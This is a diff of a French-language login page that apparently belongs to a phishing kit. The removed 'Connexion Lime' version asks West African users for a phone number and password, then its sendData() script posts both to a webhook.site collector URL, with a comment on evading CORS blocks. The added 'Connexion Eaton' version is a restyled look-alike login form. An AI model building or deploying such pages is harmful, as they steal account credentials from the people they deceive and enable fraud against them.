@@ -1,200 +1,132 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connexion Lime</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connexion Eaton</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f0f0f0;
+      font-family: 'Arial', sans-serif;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
-    .background {
-      background: url('https://i.imgur.com/AVktJnm.png') no-repeat center top;
-      background-size: cover;
-      height: 50vh;
-      position: relative;
-    }
-    .container {
-      background-color: #fff;
-      border-top-left-radius: 30px;
-      border-top-right-radius: 30px;
-      margin-top: -40px;
-      padding: 30px;
-      box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.1);
-    }
+
     .logo {
-      display: block;
-      margin: 0 auto;
+      margin-top: 50px;
+    }
+
+    .logo img {
       width: 120px;
     }
-    h2 {
-      text-align: center;
-      color: #2ecc71;
-      margin: 20px 0;
+
+    .container {
+      background-color: #fff;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 40px;
+      border-radius: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+      padding: 30px 20px;
+      position: relative;
+      z-index: 1;
     }
-    .form-group {
-      margin-bottom: 20px;
-    }
-    .phone-input {
-      display: flex;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      overflow: hidden;
-    }
-    .prefix {
-      background: #eee;
-      padding: 10px;
+
+    .input-group {
       display: flex;
       align-items: center;
-      cursor: pointer;
+      background-color: #f0f0f0;
+      border-radius: 25px;
+      padding: 12px 15px;
+      margin-bottom: 15px;
+      color: #999;
+    }
+
+    .input-group span {
+      color: #009fe3;
+      margin-right: 8px;
       font-weight: bold;
     }
-    .prefix:hover {
-      background: #ddd;
-    }
-    .input {
-      flex: 1;
+
+    .input-group input {
       border: none;
-      padding: 10px;
+      background: transparent;
       outline: none;
-      color: green;
+      flex: 1;
+      font-size: 16px;
+      color: #333;
     }
-    .input::placeholder {
-      color: green;
-    }
-    .form-group input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      color: green;
-    }
-    .form-group input[type="password"]::placeholder {
-      color: green;
-    }
+
     .btn {
-      background-color: #2ecc71;
+      width: 100%;
+      padding: 14px;
+      background-color: #f5a623;
       color: white;
       border: none;
-      padding: 15px;
-      width: 100%;
+      border-radius: 30px;
       font-size: 16px;
-      border-radius: 10px;
+      font-weight: bold;
       cursor: pointer;
-    }
-    .btn:hover {
-      background-color: #27ae60;
-    }
-    .link {
-      text-align: center;
       margin-top: 10px;
     }
-    .link a {
-      color: #2ecc71;
+
+    .bottom-text {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #888;
+    }
+
+    .bottom-text a {
+      color: #666;
       text-decoration: none;
+      font-weight: bold;
+      margin-left: 5px;
     }
-    #modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
+
+    .background-wave {
+      position: absolute;
       bottom: 0;
-      background: rgba(0, 0, 0, 0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-    }
-    #modal-content {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      width: 80%;
-    }
-    .country-option {
-      padding: 10px;
-      border-bottom: 1px solid #ccc;
-      cursor: pointer;
-    }
-    .country-option:hover {
-      background: #f0f0f0;
+      left: 0;
+      width: 100%;
+      height: 250px;
+      background-color: #ffb830;
+      border-top-left-radius: 60px;
+      border-top-right-radius: 60px;
+      z-index: 0;
     }
   </style>
 </head>
 <body>
-  <div class="background"></div>
+
+  <div class="logo">
+    <img src="https://i.imgur.com/h2hYtUu.png" alt="Eaton Logo" />
+  </div>
+
   <div class="container">
-    <img src="https://i.imgur.com/ZCXUO3X.png" alt="Logo Lime" class="logo">
-    <h2>Connexion</h2>
-    <div class="form-group">
-      <div class="phone-input">
-        <div class="prefix" id="prefix" onclick="openModal()">+221</div>
-        <input type="text" class="input" id="phone" placeholder="Entrez votre numéro de téléphone">
-      </div>
+    <div class="input-group">
+      <span contenteditable="true">+226</span>
+      <input type="tel" placeholder="Entrez votre mobile">
     </div>
-    <div class="form-group">
-      <input type="password" id="password" placeholder="Entrez votre mot de passe">
-    </div>
-    <button class="btn" type="button" onclick="sendData()">Se connecter</button>
-    <div class="link">
-      <a href="#">Aller à l'inscription ></a>
-    </div>
-  </div>
 
-  <!-- Modal -->
-  <div id="modal">
-    <div id="modal-content">
-      <h3>Sélectionner l'indicatif du pays</h3>
-      <div class="country-option" onclick="setPrefix('+221')">🇸🇳 Senegal (+221)</div>
-      <div class="country-option" onclick="setPrefix('+226')">🇧🇫 Burkina Faso (+226)</div>
-      <div class="country-option" onclick="setPrefix('+229')">🇧🇯 Benin (+229)</div>
-      <div class="country-option" onclick="setPrefix('+237')">🇨🇲 Cameroon (+237)</div>
+    <div class="input-group">
+      <input type="password" placeholder="Entrez le mot de passe de connexion">
+    </div>
+
+    <button class="btn">Se connecter</button>
+
+    <div class="bottom-text">
+      Pas de compte ? <a href="#">S’inscrire maintenant</a>
     </div>
   </div>
 
-  <script>
-    function openModal() {
-      document.getElementById("modal").style.display = "flex";
-    }
+  <div class="background-wave"></div>
 
-    function setPrefix(prefix) {
-      document.getElementById("prefix").innerText = prefix;
-      document.getElementById("modal").style.display = "none";
-    }
-
-    window.onclick = function(event) {
-      const modal = document.getElementById("modal");
-      if (event.target === modal) {
-        modal.style.display = "none";
-      }
-    }
-
-    function sendData() {
-      const prefix = document.getElementById("prefix").innerText;
-      const phone = document.getElementById("phone").value;
-      const password = document.getElementById("password").value;
-
-      const data = {
-        phone: prefix + phone,
-        password: password
-      };
-
-      fetch("https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5", {
-        method: "POST",
-        headers: {
-          "Content-Type": "text/plain"  // ✅ évite les blocages CORS
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => {
-        console.log("Données envoyées avec succès");
-      })
-      .catch(error => {
-        console.error("Erreur lors de l'envoi :", error);
-      });
-    }
-  </script>
 </body>
 </html>
